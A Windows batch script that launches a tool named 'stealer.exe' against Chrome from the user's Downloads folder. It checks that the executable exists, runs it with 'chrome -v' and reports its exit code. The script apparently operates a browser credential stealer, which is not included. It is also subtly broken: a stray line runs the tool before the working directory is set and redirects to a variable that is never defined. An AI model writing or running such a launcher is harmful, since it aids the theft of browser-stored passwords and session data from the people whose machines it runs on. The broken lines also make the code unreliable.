@echo off
REM Batch script to execute the tool and display output.
SETLOCAL ENABLEEXTENSIONS

REM --- Configuration ---
SET "EXE_NAME=stealer.exe"
SET "BROWSER_ARG=chrome"
SET "VERSION_ARG=-v"
SET "WORKING_DIR=%USERPROFILE%\Downloads"
REM Execute the tool and force output redirection to the specific path
"stealer.exe" chrome -v > %OUTPUT_FILE%

REM --- Execution ---

REM Set the working directory to ensure correct execution context
cd /d "%WORKING_DIR%"

REM Check if stealer.exe exists
if not exist "%EXE_NAME%" (
    echo [!] ERROR: %EXE_NAME% not found in %WORKING_DIR%
    exit /b 1
)

echo [*] Running: %EXE_NAME% %BROWSER_ARG% %VERSION_ARG%

REM Execute stealer.exe with the two arguments and capture exit code immediately after
"%EXE_NAME%" %BROWSER_ARG% %VERSION_ARG%
SET EXITCODE=%ERRORLEVEL%

echo [*] %EXE_NAME% exited with code %EXITCODE%

ENDLOCAL

REM Use the captured exit code for the final script exit.
exit /b %EXITCODE%

